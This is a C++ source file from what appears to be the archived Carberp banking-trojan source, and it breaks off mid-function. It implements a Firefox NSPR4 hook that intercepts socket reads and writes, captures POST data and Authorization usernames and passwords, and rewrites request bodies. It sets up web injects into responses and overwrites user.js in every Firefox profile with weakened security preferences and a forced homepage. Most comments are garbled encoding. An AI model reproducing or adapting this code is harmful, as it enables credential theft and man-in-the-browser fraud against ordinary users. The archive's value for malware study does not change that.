/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "stdafx.h"

#include <windows.h>
#include <shlobj.h>
#include <wininet.h>

#include "defines.h"
#include "core.h"

#include "dynamicconfig.h"
#include "localconfig.h"
#include "cryptedstrings.h"
#include "nspr4hook.h"
#include "httpgrabber.h"

#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\httptools.h"

#include "..\common\debug.h"
#include "..\common\fs.h"
#include "..\common\process.h"

#if(BO_NSPR4 > 0)

////////////////////////////////////////////////////////////////////////////////////////////////////
// �������� ������� �������� �� NSPR4.
////////////////////////////////////////////////////////////////////////////////////////////////////

//PRFileDesc.
typedef struct
{
  void *methods;
  void *secret;
  void *lower, *higher;
  void ( *dtor)(void *fd);
  int identity;
}PRFILEDESC;

#define PR_POLL_READ   0x01
#define PR_POLL_WRITE  0x02
#define PR_POLL_EXCEPT 0x04
#define PR_POLL_ERR    0x08
#define PR_POLL_NVAL   0x10
#define PR_POLL_HUP    0x20

//PRPollDesc
typedef struct
{
  PRFILEDESC* fd;
  __int16 in_flags;  //PR_POLL_*.
  __int16 out_flags; //PR_POLL_*.
}PRPOLLDESC;

//PRStatus
typedef enum
{
  PR_FAILURE = -1,
  PR_SUCCESS = 0
}PRSTATUS;

//����� nspr4.dll
static HMODULE handle;

//������� �������� ������. 
typedef void *(__cdecl *PR_OPENTCPSOCKET)(int af);
static PR_OPENTCPSOCKET prOpenTcpSocket;

//������� �������� �������.
typedef PRSTATUS (__cdecl *PR_CLOSE)(void *fd);
static PR_CLOSE prClose;

//������� ������.
typedef int (__cdecl *PR_READ)(void *fd, void *buf, __int32 amount);
static PR_READ prRead;

//������� ������.
typedef int (__cdecl *PR_WRITE)(void *fd, const void *buf, __int32 amount);
static PR_WRITE prWrite;

//��������� ���� ������.
typedef char *(__cdecl *PR_GETNAMEFORIDENTITY)(int ident);
static PR_GETNAMEFORIDENTITY prGetNameForIdentity;

//��������� ������.
typedef void (__cdecl *PR_SETERROR)(__int32 errorCode, __int32 oserr);
static PR_SETERROR prSetError;

//��������� ������.
typedef __int32 (__cdecl *PR_GETERROR)(void);
static PR_GETERROR prGetError;

////////////////////////////////////////////////////////////////////////////////////////////////////
// ������� ����������.
////////////////////////////////////////////////////////////////////////////////////////////////////

typedef struct
{
  PRFILEDESC *fd;                        //����� ����������.
  LPSTR url;                             //������� URL. ������������ ������ ��� �������.
  DWORD writeBytesToSkip;                //���������� ���� ������� ����� ��������������� � PR_Write().

  HttpGrabber::INJECTFULLDATA *injects; //������ �������, ����������� ��� ����������.
  DWORD injectsCount;                   //���. ��������� � injects.

  LPBYTE response;                       //����� ��� ���������� ������ ����������� �� �������.
  DWORD responseSize;                    //������ response.

  struct
  {
    void *buf;
    DWORD size;
    DWORD pos;
    DWORD realSize;
  }pendingRequest; //������ ��������� ��� �������� �� ������� PR_Write().

  struct
  {
    void *buf;
    DWORD size;
    DWORD pos;
  }pendingResponse; //������ ��������� ��� �������� ������� PR_Read().
}NSPR4CONNECTION;

static NSPR4CONNECTION *connections;
static DWORD connectionsCount;
static CRITICAL_SECTION connectionsCs;

/*
  ����� ������������ � �������.

  IN fd  - �����.

  Return - ������ ���������� � �������, ��� (DWORD)-1 ���� �� �������.
*/
static DWORD connectionFind(const PRFILEDESC *fd)
{
  if(fd != NULL)for(DWORD i = 0; i < connectionsCount; i++)if(connections[i].fd == fd)return i;
  return (DWORD)-1;
}

/*
  ���������� ���������� � �������.

  IN fd  - �����.

  Return - ������ ���������� � �������, ��� (DWORD)-1 ���� �� �������.
*/
static DWORD connectionAdd(const PRFILEDESC *fd)
{
  NSPR4CONNECTION *newConnection = NULL;
  DWORD index                    = (DWORD)-1;
  
  //���� ���������.
  for(DWORD i = 0; i < connectionsCount; i++)if(connections[i].fd == NULL)
  {
    newConnection = &connections[i];
    index = i;
    break;
  }
  
  //��������� �����.
  if(newConnection == NULL && Mem::reallocEx(&connections, sizeof(NSPR4CONNECTION) * (connectionsCount + 1)))
  {
    index         = connectionsCount++;
    newConnection = &connections[index];
  }

  //���������.
  if(newConnection != NULL)
  {
    newConnection->fd               = (PRFILEDESC *)fd;
    newConnection->url              = NULL;
    newConnection->writeBytesToSkip = 0;
    newConnection->injects          = NULL;
    newConnection->injectsCount     = 0;
    
    newConnection->response         = NULL;
    newConnection->responseSize     = 0;

    Mem::_zero(&newConnection->pendingRequest, sizeof(newConnection->pendingRequest));
    Mem::_zero(&newConnection->pendingResponse, sizeof(newConnection->pendingResponse));
  }  
  return index;
}

/*
  �������� ���������� �� �������.

  IN index - ������ ����������.
*/
static void connectionRemove(DWORD index)
{
  NSPR4CONNECTION *newConnection = &connections[index];
  
  newConnection->fd = NULL;
  Mem::free(newConnection->url);
  HttpGrabber::_freeInjectFullDataList(newConnection->injects, newConnection->injectsCount);
  Mem::free(newConnection->response);
  Mem::free(newConnection->pendingRequest.buf);
  Mem::free(newConnection->pendingResponse.buf);
  
  //�����������.
  {
    DWORD newCount = connectionsCount;
    while(newCount > 0 && connections[newCount - 1].fd == NULL)newCount--;
    if(newCount != connectionsCount)
    {
      if(newCount == 0)
      {
        Mem::free(connections);
        connections = NULL;
      }
      else Mem::reallocEx(&connections, sizeof(NSPR4CONNECTION) * newCount);
      connectionsCount = newCount;
    }
  }
}

////////////////////////////////////////////////////////////////////////////////////////////////////
/*
  ������ enumProfiles().

  IN path  - ������ ���� �������.
  IN param - ����������� ��������.

  Return   - true - ��� ����������� ������,
             false - ��� ���������� ������.
*/
typedef bool (ENUMPROFILESPROC)(const LPWSTR path, void *param);

/*
  ������������ ���� �������� �������� �����.

  IN proc  - �������.
  IN param - ����������� �������� ��� ��������.
*/
static void enumProfiles(ENUMPROFILESPROC proc, void *param)
{
  //������� �������� ����������.
  WCHAR firefoxHome[MAX_PATH];
  CSTR_GETW(firefoxPath, nspr4_firefox_home_path);
  if(CWA(shell32, SHGetFolderPathW)(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, firefoxHome) == S_OK && Fs::_pathCombine(firefoxHome, firefoxHome, firefoxPath))
  {
    //�������� ������ ��������.
    WCHAR profilesFile[MAX_PATH];
    
    CSTR_GETW(profilesBaseName, nspr4_firefox_file_profiles);
    if(Fs::_pathCombine(profilesFile, firefoxHome, profilesBaseName) && CWA(kernel32, GetFileAttributesW)(profilesFile) != INVALID_FILE_ATTRIBUTES)
    {
      WCHAR section[10];
      WCHAR profilePath[MAX_PATH];
      UINT isRelative;

      CSTR_GETW(keyProfileIdFormat, nspr4_firefox_profile_id_format);
      CSTR_GETW(keyProfileRelative, nspr4_firefox_profile_relative);
      CSTR_GETW(keyProfilePath,     nspr4_firefox_profile_path);

      for(BYTE i = 0; i < 250; i++)
      {
        //�������� ������ �������� �������.
        if(Str::_sprintfW(section, sizeof(section) / sizeof(WCHAR), keyProfileIdFormat, i) < 1 ||
           (isRelative = CWA(kernel32, GetPrivateProfileIntW)(section, keyProfileRelative, (INT)(UINT)-1, profilesFile)) == (UINT)-1
          )break;
         
        if(CWA(kernel32, GetPrivateProfileStringW)(section, keyProfilePath, NULL, profilePath, sizeof(profilePath) / sizeof(WCHAR), profilesFile) == 0)continue;
        Fs::_normalizeSlashes(profilePath);
        
        //�������� �������.
        if(isRelative == 1) //������ ������� 1, �������� ���� firefox.
        {
          WCHAR fullPath[MAX_PATH];
          if(Fs::_pathCombine(fullPath, firefoxHome, profilePath) && !proc(fullPath, param))break;
        }
        else
        {
          if(!proc(profilePath, param))break;
        }
      }
    }
  }
}

static bool enumProfilesForUserJs(const LPWSTR path, void *param)
{
#if defined WDEBUG1
  WDEBUG1(WDDT_INFO, "path=[%s].", path);  
#endif  
  
  WCHAR userJsFile[MAX_PATH];  
  CSTR_GETW(userJsBaseName, nspr4_firefox_file_userjs);

  if(Fs::_pathCombine(userJsFile, path, userJsBaseName))
  {
    HANDLE fileHandle = CWA(kernel32, CreateFileW)(userJsFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(fileHandle != INVALID_HANDLE_VALUE)
    {
      bool ok = false;
      DWORD writed;
      CSTR_GETA(preferencesData, nspr4_firefox_prefs_security);

      if(CWA(kernel32, WriteFile)(fileHandle, preferencesData, (CryptedStrings::len_nspr4_firefox_prefs_security - 1), &writed, NULL) != FALSE &&
         writed == (CryptedStrings::len_nspr4_firefox_prefs_security - 1))
      {
        LPSTR advancedPrefs = (LPSTR)param;
        if(advancedPrefs == NULL)
        {
          ok = true;
        }
        else
        {
          DWORD advancedPrefsSize = Str::_LengthA(advancedPrefs);
          ok = (CWA(kernel32, WriteFile)(fileHandle, advancedPrefs, advancedPrefsSize, &writed, NULL) != FALSE && writed == advancedPrefsSize);
        }
      }

      CWA(kernel32, FlushFileBuffers)(fileHandle);
      CWA(kernel32, CloseHandle)(fileHandle);
      if(ok == false)Fs::_removeFile(userJsFile);
    }
  }
  return true;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

void Nspr4Hook::init(const LPWSTR homePage)
{
  if(coreData.integrityLevel > Process::INTEGRITY_LOW && CWA(kernel32, GetModuleHandleW)(L"nspr4.dll") != NULL) //��� ������� ������ firefox, ������ ������ ��������.
  {
    //������ ��������� ������������.
    if(homePage != NULL && *homePage != 0)
    {
      LPWSTR homePageSlashed = Str::_addSlashesExW(homePage, -1); 
      if(homePageSlashed != NULL)
      {
        Str::UTF8STRING u8s;
        bool ok = Str::_utf8FromUnicode(homePageSlashed, -1, &u8s);
        Mem::free(homePageSlashed);

        if(ok)
        {
          LPSTR advancedUserJs;
          {
            CSTR_GETA(prefsFormat, nspr4_firefox_prefs_homepage);
            ok = (Str::_sprintfExA(&advancedUserJs, prefsFormat, u8s.data) > 0);
          }
          Str::_utf8Free(&u8s);
          
          if(ok)
          {
            enumProfiles(enumProfilesForUserJs, advancedUserJs);
            Mem::free(advancedUserJs);
          }
        }
      }
    }
    else enumProfiles(enumProfilesForUserJs, NULL);
  }
}

void Nspr4Hook::uninit(void)
{

}

void Nspr4Hook::_getCookies(void)
{
  //FIXME
}

void Nspr4Hook::_removeCookies(void)
{
  //FIXME
}

void Nspr4Hook::updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void *close, void *readAddress, void *writeAddress)
{
  ::connections      = NULL;
  ::connectionsCount = 0;
  CWA(kernel32, InitializeCriticalSection)(&connectionsCs);

  ::handle               = moduleHandle;
  ::prOpenTcpSocket      = (PR_OPENTCPSOCKET)openTcpSocket;
  ::prClose              = (PR_CLOSE)close;
  ::prRead               = (PR_READ)readAddress;
  ::prWrite              = (PR_WRITE)writeAddress;
  ::prGetNameForIdentity = (PR_GETNAMEFORIDENTITY)CWA(kernel32, GetProcAddress)(handle, "PR_GetNameForIdentity");
  ::prSetError           = (PR_SETERROR)CWA(kernel32, GetProcAddress)(handle, "PR_SetError");
  ::prGetError           = (PR_GETERROR)CWA(kernel32, GetProcAddress)(handle, "PR_GetError");
}

////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  ���������� HttpGrabber::REQUESTDATA.

  OUT requestData - ���������. ���� (requestData->handle == NULL) ������ ����� ���������������.
  IN fd           - ����� �������.
  IN data         - ������.
  IN dataSize     - ������ ������.

  Return          -  ���. ����, ����� ������� ����� ������ ������������ �������� ������,
                    (DWORD)-1 - � ������ ������, ���������� ������� ���������� ������ ������.
*/
static DWORD fillRequestData(HttpGrabber::REQUESTDATA *requestData, const PRFILEDESC *fd, const void *data, DWORD dataSize)
{
  LPSTR version;
  DWORD versionSize;
  LPSTR uri;
  DWORD uriSize;
  LPSTR host;
  DWORD hostSize;
  LPSTR method;
  DWORD methodSize;
  LPSTR postData;
  DWORD postDataSize;
  LPSTR tmp;
  DWORD tmpSize;

  Mem::_zero(requestData, sizeof(HttpGrabber::REQUESTDATA));

  //��������� �������� ������.
  if((version  = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_REQUEST_HTTP_VERSION, &versionSize))  == NULL || Str::_CompareA(version, "HTTP/1.1", versionSize, 8) != 0 ||
     (uri      = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_HTTP_URI,     &uriSize))      == NULL || uriSize == 0    ||
     (method   = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_HTTP_METHOD,  &methodSize))   == NULL || methodSize == 0 ||
     (host     = HttpTools::_getMimeHeader(data, dataSize, "Host",                             &hostSize))     == NULL || hostSize == 0   ||
     (postData = HttpTools::_getMimeHeader(data, dataSize, (LPSTR)HttpTools::GMH_DATA,         &postDataSize)) == NULL)
  {
    return (DWORD)-1; //������ ���������.
  }
  
  //��������� ������� ���� ����� ����������, �� ������ �������� ���������� �������.
  DWORD bytesToSkip = 0;
  if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Content-Length", &tmpSize)) != NULL)
  {
    if(tmpSize == 0 || tmpSize > sizeof("4294967295") - 1)return (DWORD)-1;
    char number[11];
    bool sign;
    Str::_CopyA(number, tmp, tmpSize);
    bytesToSkip = Str::_ToInt32A(number, &sign);
    if(sign || bytesToSkip < postDataSize)
    {
#     if defined WDEBUG0
      WDEBUG0(WDDT_ERROR, "(bytesToSkip < postDataSize) == true.");
#     endif
      return (DWORD)-1;
    }
    bytesToSkip -= postDataSize;
  }
  else if(postDataSize != 0)
  {
    //����� ���, � POST-������ ����... ������.
    return (DWORD)-1;  
  }

#if defined WDEBUG2
  WDEBUG2(WDDT_INFO, "bytesToSkip=%i, postDataSize=%i", bytesToSkip, postDataSize);  
#endif

  //������ ��������� ��������� ���������.
  {
    requestData->flags = HttpGrabber::RDF_NSPR4; 
    
    //URL.
    {
      LPSTR scheme     = "http://";
      DWORD schemeSize = 7;

      //���������� HTTPS.
      if(fd->identity > 0 && (scheme = prGetNameForIdentity(fd->identity)) != NULL && Mem::_compare(scheme, "NSS layer", 9) == 0)
      {
        scheme     = "https://";
        schemeSize = 8;
      }

      requestData->url = (LPSTR)Mem::alloc(8/*scheme*/ + hostSize + 1/*����*/ + uriSize);
      if(requestData->url == NULL)return bytesToSkip;
      
      //Scheme
      Mem::_copy(requestData->url, scheme, schemeSize);
      requestData->urlSize = schemeSize;
        
      //����. ���� �������� ������ �����.
      Mem::_copy(requestData->url + requestData->urlSize, host, hostSize);
      requestData->urlSize += hostSize;

      //����
      if(*uri != '/')requestData->url[requestData->urlSize++] = '/';

       //URI.
      Mem::_copy(requestData->url + requestData->urlSize, uri, uriSize);
      requestData->urlSize += uriSize;

      requestData->url[requestData->urlSize] = 0;
    }

    //�������.
    if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Referer", &tmpSize)) != NULL && tmpSize > 0)
    {
      requestData->referer     = Str::_CopyExA(tmp, tmpSize);
      requestData->refererSize = tmpSize;
    }
    
    //Verb.
    if(method[0] == 'P' && methodSize == 4)requestData->verb = HttpGrabber::VERB_POST;
    else if(method[0] == 'G' && methodSize == 3)requestData->verb = HttpGrabber::VERB_GET;
    else return bytesToSkip;

    //Content-Type.
    if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Content-Type", &tmpSize)) != NULL && tmpSize > 0)
    {
      requestData->contentType     = Str::_CopyExA(tmp, tmpSize);
      requestData->contentTypeSize = tmpSize;
    }
    
    if(postDataSize > 0 && postDataSize <= HttpGrabber::MAX_POSTDATA_SIZE)
    {
      requestData->postData     = (void *)postData;
      requestData->postDataSize = postDataSize;
    }

    //�������� ������ �����������.
    if((tmp = HttpTools::_getMimeHeader(data, dataSize, "Authorization", &tmpSize)) != NULL && tmpSize > 0)
    {
      if(!HttpTools::_parseAuthorization(tmp, tmpSize, &requestData->authorizationData.userName, &requestData->authorizationData.password))
      {
        requestData->authorizationData.unknownType = Str::_CopyExA(tmp, tmpSize);
      }
    }
    //������� ������������.
    requestData->dynamicConfig = DynamicConfig::getCurrent();
    requestData->localConfig   = LocalConfig::getCurrent();

    //����� �������. �������, ��� ������ ����� ������������.
    requestData->handle = (void *)fd;
  }
  
  return bytesToSkip;
}

/*
  ������� POST-������ � �������.

  IN originalRequest     - ������������ HTTP-������.
  IN originalRequestSize - ������ originalRequest.
  IN newPostData         - ����� POST-������.
  IN newPostDataSize     - ������ newPostData.
  OUT newRequest         - ����� HTTP-������. ����� ���������� ����� Mem.
  
  Return                 - ������ ������ HTTP-�������,
                           0 - � ������ ������.
*/
static DWORD replacePostData(const void *originalRequest, DWORD originalRequestSize, const void *newPostData, DWORD newPostDataSize, void **newRequest)
{
  DWORD bufSize = 0;
  LPBYTE buf    = (LPBYTE)Mem::alloc(originalRequestSize + newPostDataSize);
  if(buf == NULL)return 0;
  
  char number[11];
  int numberLen = Str::_FromInt32A(newPostDataSize, number, 10, false);
  
  DWORD headerSize;
  LPSTR header = HttpTools::_getMimeHeader(originalRequest, originalRequestSize, "Content-Length", &headerSize);

  if(header == NULL)
  {
    //� �� �� ����� ��� �� ��������� Content-Length � Content-Encdoing �����? �����? � �����
    //�������� �� ����� �������?

    Mem::free(buf);
    return 0;
  }
  else
  {
    //������ �� ������ ����������� Content-Length.
    DWORD beforeLen = (DWORD)((LPBYTE)header - (LPBYTE)originalRequest);
    Mem::_copy(buf, (LPBYTE)originalRequest, beforeLen);
    bufSize += beforeLen;
    
    //���������� Content-Length.
    Mem::_copy(buf + bufSize, number, numberLen);
    bufSize += numberLen;
    
    //������ ����� ���������� Content-Length.    
    DWORD afterLen = originalRequestSize - (beforeLen + headerSize);
    Mem::_copy(buf + bufSize, header + headerSize, afterLen);
    bufSize += afterLen;
  }

  //��������� ����� POST-������.
  if((header = HttpTools::_getMimeHeader(buf, bufSize, (LPSTR)HttpTools::GMH_DATA, &headerSize)) == NULL)
  {
    Mem::free(buf);
    return 0;
  }
  
  Mem::_copy(header, newPostData, newPostDataSize);
  bufSize = bufSize - headerSize + newPostDataSize;
  *newRequest = buf;

  return bufSize;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
// ������ HTTP.
////////////////////////////////////////////////////////////////////////////////////////////////////

//����� HTTPREQUESTINFO.flags.
enum
{
  HRIF_DEFINED_CLOSE   = 0x1, //���������� ����������� ����� �������� ������.
  HRIF_DEFINED_CHUNKED = 0x2, //������� ���� � ������� chunked.
  HRIF_DEFINED_LENGTH  = 0x4  //������ �������� ��������.
};

//���������� � �������.
typedef struct
{
  DWORD flags;         //����� HRIF_*.
  DWORD contentLength; //������ ��������.
  DWORD contentOffset; //������� �������� �� ������ �������.
  DWORD contentEndOffset; //������� ����� �������� (����� ����� ��� �� �������������� �������.)
}HTTPREQUESTINFO;

/*
  ������ HTTP-���������.

  OUT info       - ������.
  IN request     - ������.
  IN requestSize - ������ request.
  
  
  Return         -  1 - ��������� ��������,
                    0 - ��������� ��� �� ��������.
                   -1 - ������/����� �� ���������
*/
static int analizeHttpResponse(HTTPREQUESTINFO *info, const void *request, DWORD requestSize)
{
  LPBYTE dataPos = (LPBYTE)Mem::_findData(request, requestSize, "\r\n\r\n", 4);
  if(dataPos == NULL)return 0;
  if(dataPos == request)
  {
#   if defined WDEBUG0
    WDEBUG0(WDDT_ERROR, "(dataPos == request)");
#   endif
    return -1;
  }
  
  Mem::_zero(info, sizeof(HTTPREQUESTINFO));
  
  LPSTR header;
  DWORD headerSize;

  //������.
  header = HttpTools::_getMimeHeader(request, requestSize, (LPSTR)HttpTools::GMH_RESPONSE_HTTP_VERSION, &headerSize);

  if(header == NULL || headerSize != 8 || Str::_CompareA("HTTP/1.", header, 7, 7) != 0)
  {
#   if(BO_DEBUG > 0) && defined WDEBUG2
    LPSTR p = Str::_CopyExA(header, headerSize);
    WDEBUG2(WDDT_ERROR, "Bad HTTP-version: header=%S, headerSize=%u", p, headerSize);
    Mem::free(p);
#   endif
    return -1;
  }

  //���.
  header = HttpTools::_getMimeHeader(request, requestSize, (LPSTR)HttpTools::GMH_RESPONSE_STATUS, &headerSize);
  if(header == NULL || headerSize != 3 || !(header[0] == '2' && header[1] == '0' && header[2] == '0'))
  {
#   if defined WDEBUG0
    //WDEBUG0(WDDT_ERROR, "Bad response status.");
#   endif
    return -1;
  }

  //Transfer-Encoding
  if((header = HttpTools::_getMimeHeader(request, requestSize, "Transfer-Encoding", &headerSize)) != NULL)
  {
    if(Str::_CompareA("chunked", header, 7, headerSize) != 0)
    {
#     if(BO_DEBUG > 0) && defined WDEBUG2
      LPSTR p = Str::_CopyExA(header, headerSize);
      WDEBUG2(WDDT_ERROR, "Bad Transfer-Encoding header: header=%S, headerSize=%u", p, headerSize);
      Mem::free(p);
#     endif
      return -1;
    }
    info->flags |= HRIF_DEFINED_CHUNKED;
  }

  //Content-Length
  if((header = HttpTools::_getMimeHeader(request, requestSize, "Content-Length", &headerSize)) != NULL)
  {
    LPSTR tmp = Str::_CopyExA(header, headerSize);
    bool bad = (tmp == NULL || (info->contentLength = (DWORD)Str::_ToInt32A(tmp, NULL)) < 0);
    Mem::free(tmp);
    info->flags |= HRIF_DEFINED_LENGTH;
    if(bad)
    {
#   if(BO_DEBUG > 0) && defined WDEBUG2
      LPSTR p = Str::_CopyExA(header, headerSize);
      WDEBUG2(WDDT_ERROR, "Bad Content-Length header: header=%S, headerSize=%u", p, headerSize);
      Mem::free(p);
#     endif
      return -1;
    }
  }

  //Connection: close
  if(((header = HttpTools::_getMimeHeader(request, requestSize, "Connection", &headerSize)) != NULL && headerSize == 5 && Str::_CompareA("close", header, 5, 5) == 0) ||
  //Proxy-Connection: close, �� ������ ��� � ���� ���� �����.  
    (header = HttpTools::_getMimeHeader(request, requestSize, "Proxy-Connection", &headerSize)) != NULL && headerSize == 5 && Str::_CompareA("close", header, 5, 5) == 0)
  {
    info->flags |= HRIF_DEFINED_CLOSE;
  }

  /*
    On HTTP 1.1, when connection is not to get closed, but no Content-Length nor
    Content-Encoding chunked have been received, according to RFC2616 section 4.4 point 5,
    we assume that the server will close the connection to signal the end of the document.
  */
  if((info->flags & (HRIF_DEFINED_CHUNKED | HRIF_DEFINED_LENGTH | HRIF_DEFINED_CLOSE)) == 0)info->flags |= HRIF_DEFINED_CLOSE;
  
  info->contentOffset = (DWORD)(dataPos -(LPBYTE)request) + 4/*\r\n\r\n*/;
  return 1;
}

/*
  �������� ��������.
  
  IN OUT info     - ������.
  IN request      - ������.
  IN requestSize  - ������ request.
  IN isClose      - true - �������� ������� Close �� �������.
  OUT content     - �������. ���������� ������ ��� ���������� 1.
  OUT contentSize - ������ content.

  Return          -  1 - ������� ��������,
                     0 - ������� ��� �� ��������.
                    -1 - ������/����� �� ���������
*/
static int analizeHttpResponseBody(HTTPREQUESTINFO *info, const LPBYTE buffer, DWORD bufferSize, bool isClose, void **content, LPDWORD contentSize)
{
  DWORD curSize = bufferSize - info->contentOffset;
  if(info->flags & HRIF_DEFINED_LENGTH)
  {
    //�� �������� ��� ����� ��������.
#   if defined WDEBUG2
    WDEBUG2(WDDT_INFO, "HRIF_DEFINED_LENGTH, curSize=%u, info->contentLength=%u.", curSize, info->contentLength);
#   endif
    if(curSize < info->contentLength)return 0;
    
    if((*content = Mem::copyEx(buffer + info->contentOffset, info->contentLength)) == NULL)return -1;
    *contentSize = info->contentLength;
    info->contentEndOffset = info->contentOffset + info->contentLength;
  }
  else if(info->flags & HRIF_DEFINED_CHUNKED)
  {
    int retVal;    
    LPBYTE end              = buffer + bufferSize;
    LPBYTE contentBuffer    = NULL;
    DWORD contentBufferSize = 0;
    void *nextChunk         = buffer + info->contentOffset;

#   if defined WDEBUG1
    WDEBUG1(WDDT_INFO, "HRIF_DEFINED_CHUNKED, curSize=%u.", curSize);
#   endif
    for(;;)
    {
      void *chunkData;
      DWORD chunkDataSize;
      
      if(nextChunk == end || (Mem::_findData(nextChunk, (end - nextChunk), "\r\n", 2) == NULL && Mem::_findData(nextChunk, (end - nextChunk), "\n", 1) == NULL))//FIXME: ����/���������.
      {
        retVal = 0;
        break; //�� ������� ������� ���������.
      }
      
      if((nextChunk = HttpTools::_readChunkedData(nextChunk, (end - nextChunk), &chunkData, &chunkDataSize)) == NULL)
      {
        retVal = -1;
        break; //������ ��������, ���������� ������.
      }

      if(chunkData == NULL)
      {
        retVal = 0;
        break; //�� ������� ������� ���������.
      }

      if(chunkDataSize == 0)
      {
        retVal = 1;
        break; //������� ��������.
      }

      if(!Mem::reallocEx(&contentBuffer, contentBufferSize + chunkDataSize))
      {
        retVal = -1;
        break; //�� ���������� ������.
      }

      Mem::_copy(contentBuffer + contentBufferSize, chunkData, chunkDataSize);
      contentBufferSize += chunkDataSize;
    }                                                                                   

    if(retVal != 1)
    {
      Mem::free(contentBuffer);
      return retVal;
    }
    
    *content               = contentBuffer;
    *contentSize           = contentBufferSize;
    info->contentEndOffset = (DWORD)((LPBYTE) nextChunk - (LPBYTE)buffer);
  }
  else if(info->flags & HRIF_DEFINED_CLOSE)
  {
#   if defined WDEBUG1
    WDEBUG1(WDDT_INFO, "HRIF_DEFINED_CLOSE, curSize=%u.", curSize);
#   endif
    if(!isClose)return 0;

    if((*content = Mem::copyEx(buffer + info->contentOffset, curSize)) == NULL)return -1;
    *contentSize = curSize;
    info->contentEndOffset = info->contentOffset + curSize;
  }
  
# if defined WDEBUG1
  WDEBUG1(WDDT_INFO, "info->contentEndOffset=%u.", info->contentEndOffset);
# endif
  return 1;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

void *__cdecl Nspr4Hook::hookerPrOpenTcpSocket(int af)
{
#if defined WDEBUG0
  WDEBUG0(WDDT_INFO, "Called");
#endif

  void *fd = prOpenTcpSocket(af);
  if(fd != NULL && Core::isActive())
  {
    //FIXME: ��������� ������ ��� �������������� �������.
    CWA(kernel32, EnterCriticalSection)(&connectionsCs); 
    connectionAdd((PRFILEDESC *)fd);
    CWA(kernel32, LeaveCriticalSection)(&connectionsCs);

#   if defined WDEBUG1
    WDEBUG1(WDDT_INFO, "Connection 0x%p added to table.", fd);
#   endif
  }
  return fd;
}

int __cdecl Nspr4Hook::hookerPrClose(void *fd)
{
#if defined WDEBUG0
  WDEBUG0(WDDT_INFO, "Called");
#endif

  PRSTATUS status = prClose(fd);
  if(status == PR_SUCCESS && fd != NULL && Core::isActive())
  {
    CWA(kernel32, EnterCriticalSection)(&connectionsCs);
    DWORD connectionIndex = connectionFind((PRFILEDESC *)fd);
    if(connectionIndex != (DWORD)-1)
    {
      connectionRemove(connectionIndex);
#     if defined WDEBUG2
      WDEBUG2(WDDT_INFO, "Connection 0x%p removed from table, current connectionsCount=%u.", fd, connectionsCount);
#     endif
    }
    CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
  }

  return status;
}

__int32 __cdecl Nspr4Hook::hookerPrRead(void *fd, void *buf, __int32 amount)
{
#if defined WDEBUG0
  WDEBUG0(WDDT_INFO, "Called");
#endif

  if(Core::isActive() && buf != NULL && amount > 0)
  {
    CWA(kernel32, EnterCriticalSection)(&connectionsCs);
    DWORD connectionIndex = connectionFind((PRFILEDESC *)fd);
    if(connectionIndex != (DWORD)-1)
    {
      NSPR4CONNECTION *nc = &connections[connectionIndex];

      //������������ �����.
      if(nc->pendingResponse.size > 0)
      {
sendPendingData:
        __int32 size = nc->pendingResponse.size - nc->pendingResponse.pos;
        if(amount < size)size = amount;

#       if defined WDEBUG3
        WDEBUG3(WDDT_INFO, "Pending data detected, nc->pendingResponse.size=%u, nc->pendingResponse.pos=%u, size=%u", nc->pendingResponse.size, nc->pendingResponse.pos, size);
#       endif
        Mem::_copy(buf, (LPBYTE)nc->pendingResponse.buf + nc->pendingResponse.pos, size);
        nc->pendingResponse.pos += size;

        //����� ����.
        if(nc->pendingResponse.pos == nc->pendingResponse.size)
        {
          Mem::free(nc->pendingResponse.buf);
#         if defined WDEBUG0
          WDEBUG0(WDDT_INFO, "All pending data sended.");
#         endif
          Mem::_zero(&nc->pendingResponse, sizeof(nc->pendingResponse));
        }
        CWA(kernel32, LeaveCriticalSection)(&connectionsCs);
        return size;
      }
        
      //������ ����� ��������������, ���� ���� ������� �� ��� ��������.
      if(nc->injectsCount > 0)//FIXME: pipeline.
      {
#       if defined WDEBUG0
        WDEBUG0(WDDT_INFO, "Injects detected.");
#       endif        
        CWA(kernel32, LeaveCriticalSection)(&connectionsCs);        

        __int32 readed = prRead(fd, buf, amount);
#       if defined WDEBUG1
        WDEBUG1(WDDT_INFO, "readed=%i", readed);
#       endif
        
        if(readed > -1)
        {
          CWA(kernel32, EnterCriticalSection)(&connectionsCs);
          if((connectionIndex = connectionFind((PRFILEDESC *)fd)) == (DWORD)-1 || 
             (readed != 0 && !Mem::reallocEx(&connections[connectionIndex].response, connections[connectionIndex].responseSize + readed)))
          {
#           if defined WDEBUG0
            WDEBUG0(WDDT_ERROR, "Fatal error.");
#           endif            

            prSetError(-6000L/*PR_OUT_OF_MEMORY_ERROR*/, ERROR_NOT_ENOUGH_MEMORY);
            readed = -1;
          }
          else
          {
            nc = &connections[connectionIndex];

            //��������� �����.
            if(readed > 0)
            {
              Mem::_copy(nc->response + nc->responseSize, buf, readed);
              nc->responseSize += readed;
#             if defined WDEBUG1
              WDEBUG1(WDDT_INFO, "nc->responseSize=%u", nc->responseSize);
#             endif
            }

            //����������� ����������.
            int analizeResult;
            {
              HTTPREQUESTINFO info;
              void *content;
              DWORD contentSize;
              if((analizeResult = analizeHttpResponse(&info, nc->response, nc->responseSize)) == 1 &&
                 (analizeResult = analizeHttpResponseBody(&info, nc->response, nc->responseSize, (readed == 0), &content, &contentSize)) == 1)
              {
#               if defined WDEBUG1
                WDEBUG1(WDDT_INFO, "Analize successed, contentSize=%u.", contentSize);
#               endif
